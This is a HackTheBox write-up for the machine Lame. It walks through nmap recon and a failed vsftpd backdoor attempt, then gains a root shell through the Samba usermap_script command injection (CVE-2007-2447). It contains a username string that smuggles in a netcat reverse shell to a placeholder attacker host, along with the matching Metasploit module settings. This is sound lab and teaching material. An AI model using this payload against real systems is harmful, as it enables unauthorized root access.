## Overview

**Lame** is one of the original HackTheBox machines — a classic for learning exploit research and the Samba `usermap_script` vulnerability (CVE-2007-2447). Root is achieved in a single Metasploit module or manual exploit with no privilege escalation needed.

---

## Recon

```bash
nmap -sC -sV -oN nmap/lame 10.10.10.3
```

```
21/tcp  open  ftp     vsftpd 2.3.4
22/tcp  open  ssh     OpenSSH 4.7p1
139/tcp open  netbios-ssn Samba smbd 3.0.20
445/tcp open  netbios-ssn Samba smbd 3.0.20
```

**vsftpd 2.3.4** — backdoor version (CVE-2011-2523). Tried it first: triggered the backdoor smiley `:)` in the username, but port 6200 never opened. Firewall blocking it.

**Samba 3.0.20** — vulnerable to CVE-2007-2447 via the `username` field in `MS-RPC` calls.

---

## Exploitation — Samba usermap_script

The vulnerability allows command injection via a malformed username with shell metacharacters:

```bash
smbclient //10.10.10.3/tmp
# username: "/=`nohup nc -e /bin/bash ATTACKER 4444`"
```

Or with Metasploit:

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST tun0
run
```

Shell returned directly as **root** — no privesc needed.

## Takeaway

Samba 3.0.20 is seventeen years old — but machines like this still appear on internal networks during pentests. Shodan alone has thousands of exposed SMB services. Version tracking and patch management matter.
